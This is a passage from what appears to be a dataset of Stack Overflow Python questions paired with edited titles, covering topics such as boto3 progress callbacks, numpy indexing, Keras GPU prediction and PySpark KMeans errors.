Track Download of S3 file using boto3 and callbacks," I am trying to download a text file from S3 using boto3.Here is what I have written. and I am calling it using this is giving me a error that file is not present in the folder. Apparently when I already have a file with this name in the same folder it works but when I am downloading a fresh file , it errors out.What is correction I need to make? <code>  class ProgressPercentage(object): def __init__(self, filename): self._filename = filename self._size = float(os.path.getsize(filename)) self._seen_so_far = 0 self._lock = threading.Lock() def __call__(self, bytes_amount): # To simplify we'll assume this is hooked up # to a single filename. with self._lock: self._seen_so_far += bytes_amount percentage = round((self._seen_so_far / self._size) * 100,2) LoggingFile('{} is the file name. {} out of {} done. The percentage completed is {} %'.format(str(self._filename), str(self._seen_so_far), str(self._size),str(percentage))) sys.stdout.flush() transfer.download_file(BUCKET_NAME,FILE_NAME,'{}{}'.format(LOCAL_PATH_TEMP , FILE_NAME),callback = ProgressPercentage(LOCAL_PATH_TEMP + FILE_NAME))",Track download progress of S3 file using boto3 and callbacks
keeping track of indices change in numpy reshape," While using numpy.reshape in Python, is there a way to keep track of the change in indices?For example, if a numpy array with the shape (m,n,l,k) is reshaped into an array with the shape (m*n,k*l); is there a way to get the initial index ([x,y,w,z]) for the current [X,Y] index and vice versa? <code> ",keeping track of indices change in numpy.reshape
how to update spyder on anconda," I have Anaconda installed (Python 2.7.11 |Anaconda custom (64-bit)| (default, Feb 16 2016, 09:58:36) [MSC v.1500 64 bit (AMD64)] on win32) and I am using Spyder 2.3.8 Would like to update Spyder to the latest version, so I went through the commands: They all ran without errors, but the spyder version didn't change - this is command I'm using to launch: C:\Anaconda2\pythonw.exe C:\Anaconda2\cwp.py C:\Anaconda2 ""C:/Anaconda2/pythonw.exe"" ""C:/Anaconda2/Scripts/spyder-script.py"" --new-instanceAm I missing something? <code>  conda update condaconda update anacondaconda update spyder",how to update spyder on anaconda
Use a variable inside HTML email Python," I'm using information found on this post Sending Email Using PythonSo far the instructions were perfect. I have two additional things I'd like to do:Call a variable inside the bodyAdd an attachmentThe variable would be todays date. This is it: I know that with mailx, you can attach with the -a option. <code>  today = datetime.datetime.today ()tday = today.strftime (""%m-%d-%Y"")",Use a variable inside HTML email?
Change color of __init__ in Pycharm's syntax highlighting," I'm colorblind and I can barely make out the __init__ when it is on the current line where the caret is, as in this example:I just can't see it against that highlighted ""caret line"" background. Same problem for __repr__, __str__, and other such predefined items. So, I'd like to change their color. How do I do that? I looked through the color settings (pic below), but I can't figure out which one to change. None of them seem to do what I want.Yes, I know I could change the color of 'caret row', but that's not a viable alternative, because __init__'s current color also gives me problems in other circumstances.  <code> ",Change color of __init__ and other predefined items in Pycharm's syntax highlighting
Creating a connection to a subscription site with python," I am looking to open a connection with python to http://www.horseandcountry.tv which takes my login parameters via the POST method. I would like to open a connection to this website in order to scrape the site for all video links (this, I also don't know how to do yet but am using the project to learn).My question is how do I pass my credentials to the individual pages of the website? For example if all I wanted to do was use python code to open a browser window pointing to http://play.horseandcountry.tv/live/ and have it open with me already logged in, how do I go about this? <code> ",Creating a connection to a subscription site in python
Creating a connection to a subscription site," I am looking to open a connection with python to http://www.horseandcountry.tv which takes my login parameters via the POST method. I would like to open a connection to this website in order to scrape the site for all video links (this, I also don't know how to do yet but am using the project to learn).My question is how do I pass my credentials to the individual pages of the website? For example if all I wanted to do was use python code to open a browser window pointing to http://play.horseandcountry.tv/live/ and have it open with me already logged in, how do I go about this? <code> ",Creating a connection to a subscription site in python
GIMP on Windows - trying to quit from command line," In a Windows environment, I would like to make a call to GIMP for executing a python-fu script (through a BAT file) but the command line call I am using does not produce the expected results.For example, consider the following python-fu script named makeafile_and_quit.py, which rerside in my GIMP's plug-ins folder. Its purpose is to load an existing image and save under a different name: The script executes flawlessly if called from a 'GUI instance' of GIMP, calling the script through the menus. It produces a new file ending with '_2.jpg' in the same folder as the source file.The behaviour is different when called from the command prompt using the following: An instance of GIMP is created, then, closes but no file is created even though the message batch command executed successfully is seen.How can I repeat exactly the same behaviour as a 'GUI instance', from the command line? <code>  #!/usr/bin/env python# Sample call from GIMP's python-fu console:# pdb.python_fu_makeafile_and_quit_script()from gimpfu import *def makeafile_and_quit( ) : FILEPATH = 'C:\\path\\to\\file.JPG' IMAGE = pdb.gimp_file_load( FILEPATH, FILEPATH ) pdb.gimp_file_save( IMAGE, pdb.gimp_image_get_active_drawable( IMAGE ), FILEPATH + '_2.jpg', FILEPATH + '_2.jpg' ) pdb.gimp_quit(0) return# PLUGIN REGISTRATION# This is the plugin registration functionregister( 'makeafile_and_quit_script', 'v0.0', 'A new concept', 'Author', 'Author', 'Just now', '<Toolbox>/MyScripts/This will make a file and _QUIT', '', [], [], makeafile_and_quit )main() ""C:\Program Files\GIMP 2\bin\gimp-2.8.exe"" --batch '(""makeafile_and_quit.py"")' -b ""(gimp-quit 0)""",GIMP on Windows - executing a python-fu script from the command line
GIMP on Windows - trying execute a python-fu script from the command line," In a Windows environment, I would like to make a call to GIMP for executing a python-fu script (through a BAT file) but the command line call I am using does not produce the expected results.For example, consider the following python-fu script named makeafile_and_quit.py, which rerside in my GIMP's plug-ins folder. Its purpose is to load an existing image and save under a different name: The script executes flawlessly if called from a 'GUI instance' of GIMP, calling the script through the menus. It produces a new file ending with '_2.jpg' in the same folder as the source file.The behaviour is different when called from the command prompt using the following: An instance of GIMP is created, then, closes but no file is created even though the message batch command executed successfully is seen.How can I repeat exactly the same behaviour as a 'GUI instance', from the command line? <code>  #!/usr/bin/env python# Sample call from GIMP's python-fu console:# pdb.python_fu_makeafile_and_quit_script()from gimpfu import *def makeafile_and_quit( ) : FILEPATH = 'C:\\path\\to\\file.JPG' IMAGE = pdb.gimp_file_load( FILEPATH, FILEPATH ) pdb.gimp_file_save( IMAGE, pdb.gimp_image_get_active_drawable( IMAGE ), FILEPATH + '_2.jpg', FILEPATH + '_2.jpg' ) pdb.gimp_quit(0) return# PLUGIN REGISTRATION# This is the plugin registration functionregister( 'makeafile_and_quit_script', 'v0.0', 'A new concept', 'Author', 'Author', 'Just now', '<Toolbox>/MyScripts/This will make a file and _QUIT', '', [], [], makeafile_and_quit )main() ""C:\Program Files\GIMP 2\bin\gimp-2.8.exe"" --batch '(""makeafile_and_quit.py"")' -b ""(gimp-quit 0)""",GIMP on Windows - executing a python-fu script from the command line
Save scaler model in sklearn," I'm using the MinMaxScaler model in sklearn to normalize the features of a model. Now I want to use the same scaler to normalize the test set: But I don't want so use the scaler.fit() with the training data all the time. Is there a way to save the scaler and load it later from a different file?  <code>  training_set = np.random.rand(4,4)*10training_set [[ 6.01144787, 0.59753007, 2.0014852 , 3.45433657], [ 6.03041646, 5.15589559, 6.64992437, 2.63440202], [ 2.27733136, 9.29927394, 0.03718093, 7.7679183 ], [ 9.86934288, 7.59003904, 6.02363739, 2.78294206]]scaler = MinMaxScaler()scaler.fit(training_set) scaler.transform(training_set) [[ 0.49184811, 0. , 0.29704831, 0.15972182], [ 0.4943466 , 0.52384506, 1. , 0. ], [ 0. , 1. , 0. , 1. ], [ 1. , 0.80357559, 0.9052909 , 0.02893534]] [[ 8.31263467, 7.99782295, 0.02031658, 9.43249727], [ 1.03761228, 9.53173021, 5.99539478, 4.81456067], [ 0.19715961, 5.97702519, 0.53347403, 5.58747666], [ 9.67505429, 2.76225253, 7.39944931, 8.46746594]]",Save MinMaxScaler model in sklearn
What is _row slicing_ vs What is _column slicing_?," Yes, I've read this and this answer, but I cannot still grasp my mind around it... it's a basic question.In: Which one is row slicing, and which one is column slicing?And to my problem, if I want to do advanced indexing for the columns like: Which sparse matrix type is most efficient for doing M[:, indexes], CSR or CSC ? <code>  M[:, index]M[index, :] M[:, indexes] # indexes is an array like [0, 4, 9]",What is row slicing vs What is column slicing?
seaborn pairplot off-diagonal kde with two classes," I'm trying to look at a Seaborn pairplot for two different classes of variables and I'd like to see KDEs on the offdiagonals instead of scatterplots. The documentation has instructions on how to do a KDE for all of the data, but I want to see separate KDEs for each subclass of data. Suggestions welcome!My code looks something like this: which results in:As you can see the data are sufficiently dense that it is difficult to see the difference in the red and blue data on the off diagonal.  <code>  plot = sns.pairplot( df, vars=labels, hue='has_accident', palette='Set1', diag_kind='kde',)",Seaborn pairplot off-diagonal KDE with two classes
Retrieve index value from numpy array," I'm trying to create a function that will calculate the lattice distance (number of horizontal and vertical steps) between elements in a multi-dimensional numpy array. For this I need to retrieve the actual numbers from the indexes of each element as I iterate through the array. I want to store those values as numbers that I can run through a distance formula.For the example array A I'd like to create a loop that iterates through each element and for the first element 1 it would retrieve a=0, b=0 since 1 is at A[0,0], then a=0, b=1 for element 2 as it is located at A[0,1], and so on...My envisioned output is two numbers (corresponding to the two index values for that element) for each element in the array. So in the example above, it would be the two values that I am assigning to be a and b. I only will need to retrieve these two numbers within the loop (rather than save separately as another data object).Any thoughts on how to do this would be greatly appreciated! <code>  A=np.array([[1,2,3],[4,5,6],[7,8,9]])",Iterate over numpy with index (numpy equivalent of python enumerate)
How can I perform unit test of jinja2 template logic?," I've been looking for a way to unit test a jinja2 template. I already did some research, but the only thing I was able to find was related to how to test the variables passed to the template:how to unittest the template variables passed to jinja2 template from webapp2 request handlerIn other words, I would like to test if the logic used within the template is generating an expected output.I thought I could create a ""golden"" file so I could compare the files being generated with the golden file, however that would require too many ""golden"" files due to the number of possibilities.Any other ideas? <code> ",How can I unit test the jinja2 template logic?
How can I unit test jinja2 template logic?," I've been looking for a way to unit test a jinja2 template. I already did some research, but the only thing I was able to find was related to how to test the variables passed to the template:how to unittest the template variables passed to jinja2 template from webapp2 request handlerIn other words, I would like to test if the logic used within the template is generating an expected output.I thought I could create a ""golden"" file so I could compare the files being generated with the golden file, however that would require too many ""golden"" files due to the number of possibilities.Any other ideas? <code> ",How can I unit test the jinja2 template logic?
Error Installing mysqlclient on Ubuntu 16.04 with pip and Python 3.6," I am getting a strange error when trying to install mysqlclient on Ubuntu 16.04 Xenial with pip + Python 3.6: Output: Following the installation requirements, I have tried installing the required libraries, but not luck so far. Does someone know the workaround for this issue?  <code>  pip install mysqlclient _mysql.c:40:20: fatal error: Python.h: No such file or directory compilation terminated. error: command 'x86_64-linux-gnu-gcc' failed with exit status 1 sudo apt-get install python3-dev libmysqlclient-dev",Error Installing mysqlclient on Ubuntu 16.04 using pip and Python 3.6
"How do I do something like ""for i, (k, v) in enumerate(mydict)"" in python?"," How to iterate dict with enumerate such that I could unpack the index, key and value at the time of iteration?Something like: I want to iterate through the keys and values in a dictionary called mydict and count them, so I know when I'm on the last one. <code>  for i, (k, v) in enumerate(mydict): # some stuff","How to iterate `dict` with `enumerate` and unpack the index, key, and value along with iteration"
"How to iIterate `dict` with `enumerate` and unpack the index, key, and value along with iteration"," How to iterate dict with enumerate such that I could unpack the index, key and value at the time of iteration?Something like: I want to iterate through the keys and values in a dictionary called mydict and count them, so I know when I'm on the last one. <code>  for i, (k, v) in enumerate(mydict): # some stuff","How to iterate `dict` with `enumerate` and unpack the index, key, and value along with iteration"
using binary search to return index of target," Currently, when I search for the element that is at the midpoint it returns the correct index, but for any other element it does not work for me.I think I am making a mistake when I split the array: <code>  aList = [1,3,5,6,8,9,10,12,34,56,78,456] def recursiveBinarySearch(aList, target): #aList = sorted(aList) if len(aList) == 0: return False else: midpoint = len(aList) // 2 if aList[midpoint] == target: return aList.index(target) else: if target < aList[midpoint]: return recursiveBinarySearch(aList[:midpoint],target) else: return recursiveBinarySearch(aList[midpoint+1:],target) print(recursiveBinarySearch(aList,9))",How do I return the index of the target element in a Python array?
Python - Binary search returning the index of the target element in an array," Currently, when I search for the element that is at the midpoint it returns the correct index, but for any other element it does not work for me.I think I am making a mistake when I split the array: <code>  aList = [1,3,5,6,8,9,10,12,34,56,78,456] def recursiveBinarySearch(aList, target): #aList = sorted(aList) if len(aList) == 0: return False else: midpoint = len(aList) // 2 if aList[midpoint] == target: return aList.index(target) else: if target < aList[midpoint]: return recursiveBinarySearch(aList[:midpoint],target) else: return recursiveBinarySearch(aList[midpoint+1:],target) print(recursiveBinarySearch(aList,9))",How do I return the index of the target element in a Python array?
How to using timing magics for every cell in Jupyter notebook?, The %%time and %%timeit magics enable timing of a single cell in a Jupyter or iPython notebook.Is there similar functionality to turn timing on and off for every cell in a Jupyter notebook?This question is related but does not have an answer to the more general question posed of enabling a given magic automatically in every cell. <code> ,How to enable timing magics for every cell in Jupyter notebook?
How to add a shared xlabel to a subplot created with pandas' plot?," One can create subplots easily from a dataframe using pandas: How would one now add the x- and y-labels to the resulting plot? Here it is explained for a single plot. So if I wanted to add labels to a particular subplot I could do: That gives:How would one add the labels so that they are centred and do not just refer to a one row/column? <code>  import pandas as pdimport matplotlib.pyplot as pltdf = pd.DataFrame({'A': [0.3, 0.2, 0.5, 0.2], 'B': [0.1, 0.0, 0.3, 0.1], 'C': [0.2, 0.5, 0.0, 0.7], 'D': [0.6, 0.3, 0.4, 0.6]}, index=list('abcd'))ax = df.plot(kind=""bar"", subplots=True, layout=(2, 2), sharey=True, sharex=True, rot=0, fontsize=20) ax[1][0].set_xlabel('my_general_xlabel')ax[0][0].set_ylabel('my_general_ylabel')plt.show()",How to add a shared x-label and y-label to a plot created with pandas plot
How to add a shared x-label and y-label to a plot created with pandas' plot?," One can create subplots easily from a dataframe using pandas: How would one now add the x- and y-labels to the resulting plot? Here it is explained for a single plot. So if I wanted to add labels to a particular subplot I could do: That gives:How would one add the labels so that they are centred and do not just refer to a one row/column? <code>  import pandas as pdimport matplotlib.pyplot as pltdf = pd.DataFrame({'A': [0.3, 0.2, 0.5, 0.2], 'B': [0.1, 0.0, 0.3, 0.1], 'C': [0.2, 0.5, 0.0, 0.7], 'D': [0.6, 0.3, 0.4, 0.6]}, index=list('abcd'))ax = df.plot(kind=""bar"", subplots=True, layout=(2, 2), sharey=True, sharex=True, rot=0, fontsize=20) ax[1][0].set_xlabel('my_general_xlabel')ax[0][0].set_ylabel('my_general_ylabel')plt.show()",How to add a shared x-label and y-label to a plot created with pandas plot
Keras: Prediction on multiple gpus," I'm using Keras with tensorflow as backend.I have one compiled/trained model.My prediction loop is slow so I would like to find a way to parallelize the predict_proba calls to speed things up.I would like to take a list of batches (of data) and then per available gpu, run model.predict_proba() over a subset of those batches.Essentially: I know that it's possible in pure Tensorflow to assign ops to a given gpu (https://www.tensorflow.org/tutorials/using_gpu). However, I don't know how this translates to my situation since I've built/compiled/trained my model using Keras' api.I had thought that maybe I just needed to use python's multiprocessing module and start a process per gpu that would run predict_proba(batch_n). I know this is theoretically possible given another SO post of mine: Keras + Tensorflow and Multiprocessing in Python. However, this still leaves me with the dilemma of not knowing how to actually ""choose"" a gpu to operate the process on.My question boils down to: how does one parallelize prediction for one model in Keras across multiple gpus when using Tensorflow as Keras' backend?Additionally I am curious if similar parallelization for prediction is possible with only one gpu. A high level description or code example would be greatly appreciated!Thanks! <code>  data = [ batch_0, batch_1, ... , batch_N ]on gpu_0 => return predict_proba(batch_0)on gpu_1 => return predict_proba(batch_1)...on gpu_N => return predict_proba(batch_N) ",Keras + Tensorflow: Prediction on multiple gpus
Why are instance dictionaries so small in Python 3?," In Python, dictionaries created for the instances of a class are tiny compared to the dictionaries created containing the same attributes of that class: When using Python 3.5.2, the following calls to getsizeof produce: 288 - 96 = 192 bytes saved!Using Python 2.7.12, though, on the other hand, the same calls return: 0 bytes saved.In both cases, the dictionaries obviously have exactly the same contents: so this isn't a factor. Also, this also applies to Python 3 only.So, what's going on here? Why is the size of the __dict__ of an instance so tiny in Python 3? <code>  import sysclass Foo(object): def __init__(self, a, b): self.a = a self.b = bf = Foo(20, 30) >>> sys.getsizeof(vars(f)) # vars gets obj.__dict__96 >>> sys.getsizeof(dict(vars(f))288 >>> sys.getsizeof(vars(f))280>>> sys.getsizeof(dict(vars(f)))280 >>> vars(f) == dict(vars(f))True",Why is the __dict__ of instances so much smaller in size in Python 3?
Why is the instance __dict__ so small in Python 3?," In Python, dictionaries created for the instances of a class are tiny compared to the dictionaries created containing the same attributes of that class: When using Python 3.5.2, the following calls to getsizeof produce: 288 - 96 = 192 bytes saved!Using Python 2.7.12, though, on the other hand, the same calls return: 0 bytes saved.In both cases, the dictionaries obviously have exactly the same contents: so this isn't a factor. Also, this also applies to Python 3 only.So, what's going on here? Why is the size of the __dict__ of an instance so tiny in Python 3? <code>  import sysclass Foo(object): def __init__(self, a, b): self.a = a self.b = bf = Foo(20, 30) >>> sys.getsizeof(vars(f)) # vars gets obj.__dict__96 >>> sys.getsizeof(dict(vars(f))288 >>> sys.getsizeof(vars(f))280>>> sys.getsizeof(dict(vars(f)))280 >>> vars(f) == dict(vars(f))True",Why is the __dict__ of instances so much smaller in size in Python 3?
Why is the __dict__ of instances so small in Python 3?," In Python, dictionaries created for the instances of a class are tiny compared to the dictionaries created containing the same attributes of that class: When using Python 3.5.2, the following calls to getsizeof produce: 288 - 96 = 192 bytes saved!Using Python 2.7.12, though, on the other hand, the same calls return: 0 bytes saved.In both cases, the dictionaries obviously have exactly the same contents: so this isn't a factor. Also, this also applies to Python 3 only.So, what's going on here? Why is the size of the __dict__ of an instance so tiny in Python 3? <code>  import sysclass Foo(object): def __init__(self, a, b): self.a = a self.b = bf = Foo(20, 30) >>> sys.getsizeof(vars(f)) # vars gets obj.__dict__96 >>> sys.getsizeof(dict(vars(f))288 >>> sys.getsizeof(vars(f))280>>> sys.getsizeof(dict(vars(f)))280 >>> vars(f) == dict(vars(f))True",Why is the __dict__ of instances so much smaller in size in Python 3?
looping through an JSON array with python," I have the following data taken from an API. I am trying to access the restaurant name using a Python script and have the script display it. Here are my files:test.py my JSON file is as follows: (simplified) Currently, it displays the first restaurant name three times. I want it to loop through each restaurant object and display the value for the key ""name"". Any help would be appreciated.  <code>  with open('data.json') as data_file: data = json.load(data_file) for restaurant in data: print data ['restaurants'][0]['restaurant']['name'] { ""results_found"": 3296, ""results_start"": 0, ""results_shown"": 20, ""restaurants"": [ { ""restaurant"": { ""R"": { ""res_id"": 9101083 }, ""id"": ""9101083"", ""name"": ""My Meat Wagon"", ""address"": ""Market Square, Smithfield, Dublin Dublin 7"", ""locality"": ""Smithfield"", ""city"": ""Dublin"", ""city_id"": 91, ""latitude"": ""53.3489980000"", ""longitude"": ""-6.2788120000"", ""zipcode"": ""Dublin 7"", ""events_url"": ""https://www.zomato.com/dublin/my-meat-wagon-smithfield/events#tabtop?utm_source=api_basic_user&utm_medium=api&utm_campaign=v2.1"", ""establishment_types"": [] } }, { ""restaurant"": { ""R"": { ""res_id"": 9101628 }, ""id"": ""9101628"", ""name"": ""Wowburger"", ""url"": ""https://www.zomato.com/dublin/wowburger-temple-bar?utm_source=api_basic_user&utm_medium=api&utm_campaign=v2.1"", ""location"": { ""address"": ""The Workmans Club, 11 Wellington Quay, Temple Bar, Dublin Dublin 2"", ""locality"": ""The Workmans Club"", ""city"": ""Dublin"", ""city_id"": 91, ""latitude"": ""53.3452863158"", ""longitude"": ""-6.2663815543"", ""zipcode"": ""Dublin 2"", ""country_id"": 97, ""locality_verbose"": ""The Workmans Club, Dublin"" }, ""switch_to_order_menu"": 0, ""cuisines"": ""Burger"", ""average_cost_for_two"": 20, ""establishment_types"": [] } }, { ""restaurant"": { ""R"": { ""res_id"": 16520426 }, ""id"": ""16520426"", ""name"": ""Brother Hubbard"", ""locality_verbose"": ""North City, Dublin"" },",Looping through a JSON array in Python
Looping through a JSON array in python," I have the following data taken from an API. I am trying to access the restaurant name using a Python script and have the script display it. Here are my files:test.py my JSON file is as follows: (simplified) Currently, it displays the first restaurant name three times. I want it to loop through each restaurant object and display the value for the key ""name"". Any help would be appreciated.  <code>  with open('data.json') as data_file: data = json.load(data_file) for restaurant in data: print data ['restaurants'][0]['restaurant']['name'] { ""results_found"": 3296, ""results_start"": 0, ""results_shown"": 20, ""restaurants"": [ { ""restaurant"": { ""R"": { ""res_id"": 9101083 }, ""id"": ""9101083"", ""name"": ""My Meat Wagon"", ""address"": ""Market Square, Smithfield, Dublin Dublin 7"", ""locality"": ""Smithfield"", ""city"": ""Dublin"", ""city_id"": 91, ""latitude"": ""53.3489980000"", ""longitude"": ""-6.2788120000"", ""zipcode"": ""Dublin 7"", ""events_url"": ""https://www.zomato.com/dublin/my-meat-wagon-smithfield/events#tabtop?utm_source=api_basic_user&utm_medium=api&utm_campaign=v2.1"", ""establishment_types"": [] } }, { ""restaurant"": { ""R"": { ""res_id"": 9101628 }, ""id"": ""9101628"", ""name"": ""Wowburger"", ""url"": ""https://www.zomato.com/dublin/wowburger-temple-bar?utm_source=api_basic_user&utm_medium=api&utm_campaign=v2.1"", ""location"": { ""address"": ""The Workmans Club, 11 Wellington Quay, Temple Bar, Dublin Dublin 2"", ""locality"": ""The Workmans Club"", ""city"": ""Dublin"", ""city_id"": 91, ""latitude"": ""53.3452863158"", ""longitude"": ""-6.2663815543"", ""zipcode"": ""Dublin 2"", ""country_id"": 97, ""locality_verbose"": ""The Workmans Club, Dublin"" }, ""switch_to_order_menu"": 0, ""cuisines"": ""Burger"", ""average_cost_for_two"": 20, ""establishment_types"": [] } }, { ""restaurant"": { ""R"": { ""res_id"": 16520426 }, ""id"": ""16520426"", ""name"": ""Brother Hubbard"", ""locality_verbose"": ""North City, Dublin"" },",Looping through a JSON array in Python
Accessing Nan values with .loc in Pandas," I tried to solve the required task with the following code line:df['Age'][np.isnan(df[""Age""])] = rand1But this raises a ""SettingWithCopyWarning"" and I think locating the Nan values in the dataframe (Column 'Age') by using the .loc feature might be a better way of doing this. I already took a look at the documentation, but still don't know how I can fix this problem. Couldn't find any solutions on here with .loc either.I would appreciate any hints and advice. <code> ",Overwriting Nan values with .loc in Pandas
Import local python package gives ImportError," QuestionI installed a local package called credentials using But when I try to import the package from a sibling directory, it fails with an ImporError: Confusingly, the package credentials is listed as successfully installed as shown when I run pip list: How can I install my local package so that it can be imported?BackgroundI am using Python 3.4 (32-bit). The package contains two files: The __init__.py file defines a single function. The setup.py file is short: WorkaroundI currently add the directory containing the package (c:\users\worker\src\clockwork\lib) to my PATH variable as a workaround. But my question is how to install the package properly so that I do not need to modify the PATH. <code>  pip install -e c:\users\worker\src\clockwork\lib\credentials cd c:\users\worker\src\clockwork\bankpython -c ""import credentials""...ImportError: No module named 'credentials' ...credentials (1.0.0, c:\users\worker\src\clockwork\lib\credentials)... credentials\__init__.pycredentials\setup.py from distutils.core import setupsetup(name='credentials', version='1.0.0')",How to pip install a local python package?
How to import python package installed from local directory?," QuestionI installed a local package called credentials using But when I try to import the package from a sibling directory, it fails with an ImporError: Confusingly, the package credentials is listed as successfully installed as shown when I run pip list: How can I install my local package so that it can be imported?BackgroundI am using Python 3.4 (32-bit). The package contains two files: The __init__.py file defines a single function. The setup.py file is short: WorkaroundI currently add the directory containing the package (c:\users\worker\src\clockwork\lib) to my PATH variable as a workaround. But my question is how to install the package properly so that I do not need to modify the PATH. <code>  pip install -e c:\users\worker\src\clockwork\lib\credentials cd c:\users\worker\src\clockwork\bankpython -c ""import credentials""...ImportError: No module named 'credentials' ...credentials (1.0.0, c:\users\worker\src\clockwork\lib\credentials)... credentials\__init__.pycredentials\setup.py from distutils.core import setupsetup(name='credentials', version='1.0.0')",How to pip install a local python package?
In python decode newly created Image to Base64 String," for the past few hours i've been trying to create a Base64 String of an Image, but it won't work. When i try to create an image from the String again i get an exception: Other online services for Base64 Decoding also give an error, so the base64 String itself does not seem to be correct.example image String (from open().read()): example base64 String: <code>  ship_color = (0,100,100,255)img = Image.new(""RGBA"", (100,100))for i in range(20): for j in range(20): img.putpixel((40 + i, 40 + j), ship_color)img.save(""tmp.png"", format = ""PNG"")im = open(""tmp.png"", ""rb"").read()print(im)base = base64.b64encode(im)print(base) img2 = Image.frombytes(""RGBA"", (100, 100), base)ValueError: not enough image data b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00d\x00\x00\x00d\x08\x02\x00\x00\x00\xff\x80\x02\x03\x00\x00\x00lIDATx\x9c\xed\xd0\xd1\t\x800\x10\x05\xc1h\xad)+\xc5Z\xc3\x8a\x10""3\xff\xc7;v\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\xc7\xb5my\xce\xf7\xb7k}\xf7GpoY=\x94X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x81X\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0S\x0fX\xb7\x02(\x90HP\xa2\x00\x00\x00\x00IEND\xaeB`\x82' b'iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAIAAAD/gAIDAAAAbElEQVR4nO3Q0QmAMBAFwWitKSvFWsOKECIz/8c7dgwAAAAAAAAAAAAAADjHtW15zve3a333R3BvWT2UWIFYgViBWIFYgViBWIFYgViBWIFYgViBWIFYgViBWIFYgVgAAAAAAAAAAAAAAPBTD1i3AiiQSFCiAAAAAElFTkSuQmCC'",How to get a PIL image as a Base64 encoded string
Overriding len function in python," If I run this by passing a string in for data I get an error when calling len on an instance of this class. Specifically I get 'str' object cannot be interpreted as an integer.So does the return statement in __len__ have to be an integer? I would think if I am overriding it, it should be able to output whatever I want, so why is this not possible? <code>  class foo: def __init__(self, data): self.data = data def __len__(self): return self.data",How does Python ensure the return value of __len__ is an integer when len is called?
Can I user numpy xor 2 matrix?," I have 2 numpy matrix like this.matrix1 matrix2 I want to find similarity of these matrices. I think xor can be used on matrices. Xor operation should show where values are different and then I can count value 1 to calculate a percentage of similarity. I don't know how to use xor in python. This code doesn't work: a = arr1 xor arr2 .  <code>  arr1 =array([[ 0., 0., 0.], [ 0., 0., 0.], [ 0., 1., 0.]]) arr2 =array([[ 0., 0., 0.], [ 0., 0., 1.], [ 0., 0., 0.]])",Can I use xor on numpy matrices?
convert numpy in16 audio array to float32," I have raw binary int16 data that I am converting to a numpy array using audio = np.fromstring(raw_data, dtype=np.int16)The data is audio data. When I convert the data to float32, the audio is getting distorted:audio = audio.astype(np.float32, order='C')I'm saving the audio to disk to listen to it using SoundFile:soundfile.write('out.wav', audio, sample_rate)If I write the audio directly to disk without doing the astype operation, there is no distortion (ie); What is the proper way to convert the data type here? <code>  # no distortionaudio = np.fromstring(raw_data, dtype=np.int16)soundfile.write('out.wav', audio, sample_rate)# distortionaudio = np.fromstring(raw_data, dtype=np.int16)audio = audio.astype(np.float32, order='C')soundfile.write('out.wav', audio, sample_rate)",convert numpy int16 audio array to float32
How to convert type <class 'pyspark.sql.types.Row'> into Vector Ask," I'm completely new to Spark and currently I'm trying to use Python to write a simple code that does KMeans on a set of data. I typed these into pyspark shell, and when it runs model = kmeans.fit(vdf), I got the following errors: TypeError: Cannot convert type into Vector at org.apache.spark.api.python.PythonRunner$$anon$1.read(PythonRDD.scala:166) at org.apache.spark.api.python.PythonRunner$$anon$1.(PythonRDD.scala:207) at org.apache.spark.api.python.PythonRunner.compute(PythonRDD.scala:125) at org.apache.spark.api.python.PythonRDD.compute(PythonRDD.scala:70) at org.apache.spark.rdd.RDD.computeOrReadCheckpoint(RDD.scala:313) at org.apache.spark.rdd.RDD.iterator(RDD.scala:277) at org.apache.spark.rdd.MapPartitionsRDD.compute(MapPartitionsRDD.scala:38) at org.apache.spark.rdd.RDD.computeOrReadCheckpoint(RDD.scala:313) at org.apache.spark.CacheManager.getOrCompute(CacheManager.scala:69) at org.apache.spark.rdd.RDD.iterator(RDD.scala:275) at org.apache.spark.rdd.ZippedPartitionsRDD2.compute(ZippedPartitionsRDD.scala:88) at org.apache.spark.rdd.RDD.computeOrReadCheckpoint(RDD.scala:313) at org.apache.spark.rdd.RDD.iterator(RDD.scala:277) at org.apache.spark.rdd.MapPartitionsRDD.compute(MapPartitionsRDD.scala:38) at org.apache.spark.rdd.RDD.computeOrReadCheckpoint(RDD.scala:313) at org.apache.spark.rdd.RDD.iterator(RDD.scala:277) at org.apache.spark.scheduler.ResultTask.runTask(ResultTask.scala:66) at org.apache.spark.scheduler.Task.run(Task.scala:89) at org.apache.spark.executor.Executor$TaskRunner.run(Executor.scala:227) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 17/02/26 23:31:58 ERROR Executor: Exception in task 6.0 in stage 23.0 (TID 113) org.apache.spark.api.python.PythonException: Traceback (most recent call last): File ""/usr/hdp/2.5.0.0-1245/spark/python/lib/pyspark.zip/pyspark/worker.py"", line 111, in main process() File ""/usr/hdp/2.5.0.0-1245/spark/python/lib/pyspark.zip/pyspark/worker.py"", line 106, in process serializer.dump_stream(func(split_index, iterator), outfile) File ""/usr/hdp/2.5.0.0-1245/spark/python/lib/pyspark.zip/pyspark/serializers.py"", line 263, in dump_stream vs = list(itertools.islice(iterator, batch)) File ""/usr/hdp/2.5.0.0-1245/spark/python/lib/pyspark.zip/pyspark/mllib/linalg/init.py"", line 77, in _convert_to_vector raise TypeError(""Cannot convert type %s into Vector"" % type(l)) TypeError: Cannot convert type into Vector Thedata I got is from: https://archive.ics.uci.edu/ml/machine-learning-databases/00292/Wholesale%20customers%20data.csvCould someone please tell me what is going wrong here and what I missed? I appreciate any help.Thank you!UPDATE:@GarrenThe errors I got is: The errors I got is: >>> kmm = kmeans.fit(s_df)17/03/02 21:58:01 INFO BlockManagerInfo: Removed broadcast_1_piece0 on localhost:56193 in memory (size: 5.8 KB, free: 511.1 MB) 17/03/02 21:58:01 INFO ContextCleaner: Cleaned accumulator 5 17/03/02 21:58:01 INFO BlockManagerInfo: Removed broadcast_0_piece0 on localhost:56193 in memory (size: 5.8 KB, free: 511.1 MB) 17/03/02 21:58:01 INFO ContextCleaner: Cleaned accumulator 4 Traceback (most recent call last): File """", line 1, in File 